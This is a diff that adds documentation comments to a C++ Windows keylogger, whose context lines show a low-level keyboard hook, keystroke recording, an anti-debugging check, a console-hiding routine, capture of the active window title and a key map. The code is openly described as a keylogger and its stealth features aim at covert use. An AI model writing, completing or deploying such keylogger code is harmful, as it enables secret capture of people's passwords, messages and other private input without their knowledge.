@@ -15,8 +15,13 @@
 #endif
 
 #if defined(_WIN32) || defined(_WIN64)
+
+// Instance of the WindowsLogger. 
 std::unique_ptr<WindowsLogger> WindowsLogger::instance = nullptr;
 
+/**
+ * @brief Construct a new Windows Logger:: Windows Logger object
+ */
 WindowsLogger::WindowsLogger()
 {
     instance.reset(this);
@@ -28,6 +33,9 @@ WindowsLogger::WindowsLogger()
     }
 }
 
+/**
+ * @brief Destroy the Windows Logger:: Windows Logger object
+ */
 WindowsLogger::~WindowsLogger()
 {
     releaseHook();
@@ -37,6 +45,9 @@ WindowsLogger::~WindowsLogger()
     }
 }
 
+/**
+ * @brief This is the main entry point for the Windows keylogger.
+ */
 void WindowsLogger::startLogging()
 {
     AntiDebug ad;
@@ -70,6 +81,13 @@ void WindowsLogger::startLogging()
     while (GetMessage(&msg, nullptr, 0, 0)) {}
 }
 
+/**
+ * @brief This is the callback function for the keyboard hook.
+ * @param nCode -> The hook code.
+ * @param wParam -> The message identifier.
+ * @param lParam -> The pointer to the struct containing the key information.
+ * @return LRESULT -> The result of the hook callback.
+ */
 LRESULT CALLBACK WindowsLogger::keyboardHookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 {
     if (nCode >= 0 && wParam == WM_KEYDOWN)
@@ -80,6 +98,9 @@ LRESULT CALLBACK WindowsLogger::keyboardHookCallback(int nCode, WPARAM wParam, L
     return CallNextHookEx(instance->hook, nCode, wParam, lParam);
 }
 
+/**
+ * @brief This method will set the keyboard hook.
+ */
 void WindowsLogger::setKeyboardHook()
 {
     hook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookCallback, GetModuleHandle(nullptr), 0);
@@ -89,6 +110,9 @@ void WindowsLogger::setKeyboardHook()
     }
 }
 
+/**
+ * @brief This method will release the keyboard hook.
+ */
 void WindowsLogger::releaseHook()
 {
     if (hook)
@@ -97,6 +121,11 @@ void WindowsLogger::releaseHook()
     }
 }
 
+/**
+ * @brief This method will record the key stroke.
+ * @param keyStroke This is the key stroke to record.
+ * @return int, 0 if successful, -1 if not.
+ */
 int WindowsLogger::recordKeyStroke(int keyStroke)
 {
     std::stringstream output;
@@ -141,6 +170,9 @@ int WindowsLogger::recordKeyStroke(int keyStroke)
     return 0;
 }
 
+/**
+ * @brief This method will hide the console window.
+ */
 void WindowsLogger::hideConsole()
 {
 #ifdef VISIBLE_CONSOLE
@@ -151,6 +183,10 @@ void WindowsLogger::hideConsole()
 #endif
 }
 
+/**
+ * @brief This method retreives the name of the current window.
+ * @return std::string -> This will be the name of the current window.
+ */
 std::string WindowsLogger::getCurrentWindowName() const
 {
     HWND foreground = GetForegroundWindow();
@@ -159,6 +195,10 @@ std::string WindowsLogger::getCurrentWindowName() const
     return std::string(windowTitle);
 }
 
+/**
+ * @brief This method will return the current time.
+ * @return std::string -> This is the current time.
+ */
 std::string WindowsLogger::getCurrentTime() const
 {
     auto now = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
@@ -167,11 +207,19 @@ std::string WindowsLogger::getCurrentTime() const
     return oss.str();
 }
 
+/**
+ * @brief This method will check if the system is booting.
+ * @return true, if the system is booting.
+ * @return false, if the system is not booting.
+ */
 bool WindowsLogger::isSystemBooting() const
 {
     return GetSystemMetrics(SM_SHUTTINGDOWN) != 0;
 }
 
+/**
+ * @brief This is the key map for the keylogger.
+ */
 const std::map<int, std::string> WindowsLogger::keyMap = {
     {VK_BACK, "[BACKSPACE]" }, {VK_RETURN, "\n" }, {VK_SPACE, " " }, {VK_TAB, "[TAB]" },
     {VK_SHIFT, "[SHIFT]" }, {VK_LSHIFT, "[LSHIFT]" }, {VK_RSHIFT, "[RSHIFT]" },
